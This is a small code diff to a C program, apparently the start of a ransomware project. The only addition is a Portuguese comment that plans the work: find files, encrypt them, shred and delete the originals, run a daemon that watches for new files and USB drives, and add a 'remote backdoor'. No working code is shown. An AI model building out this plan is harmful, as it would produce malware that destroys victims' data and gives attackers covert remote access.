@@ -6,6 +6,21 @@
 #include"lib/crypto.h"
 #include"lib/struct.h"
 
+/*
+  
+  Procurar pelos arquivos, 
+  criptografar arquivos - criando o novo arquivo
+  shred arquivo antigo
+  depois um certo tempo, excluir os arquivos antigos
+  
+
+
+  criar daemon para procurar por novos arquivos e USB's
+  
+  remote backdoor
+*/
+
+
 
 int main(){
 
